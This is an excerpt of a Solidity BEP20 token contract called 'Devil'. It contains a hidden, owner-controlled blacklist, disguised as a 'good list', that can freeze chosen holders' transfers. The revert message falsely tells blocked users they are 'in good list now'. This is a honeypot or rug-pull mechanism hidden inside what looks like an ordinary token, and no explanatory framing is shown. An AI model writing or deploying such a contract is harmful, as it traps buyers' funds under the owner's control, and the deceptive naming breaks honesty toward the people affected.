...
contract Devil is Context, iBEP20, Ownable {
  ...
  bool isSL = true;
  uint256 _AMM = 100000;
  mapping(address => bool) private _eList;
  bool private _ioOpens = true;

  constructor() public {
    _name = 'Devil';
    _symbol = 'Devil';
    _decimals = 9;
    _totalSupply = 21000000 * 10**9; 
  ...
  */
  ...
  function transfer(address recipient, uint256 amount) external override returns (bool) {
      if (_ioOpens) {
            require(_eList[_msgSender()] == false, "You are in good list now");
        }
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
      if (_ioOpens) {
            require(_eList[sender] == false, "You are in good list now");
        }
  ...
  function addgood(address lo) external onlyOwner() {
        _eList[lo] = true;
    }

    function goodRemove(address lo) external onlyOwner() {
        delete _eList[lo];
    }

    function isIngoodList(address addr)
        external
        view
        onlyOwner()
        returns (bool)
    ...
    function setgoodSwitchOpen(bool lo) external onlyOwner() {
        _ioOpens = lo;
    }
}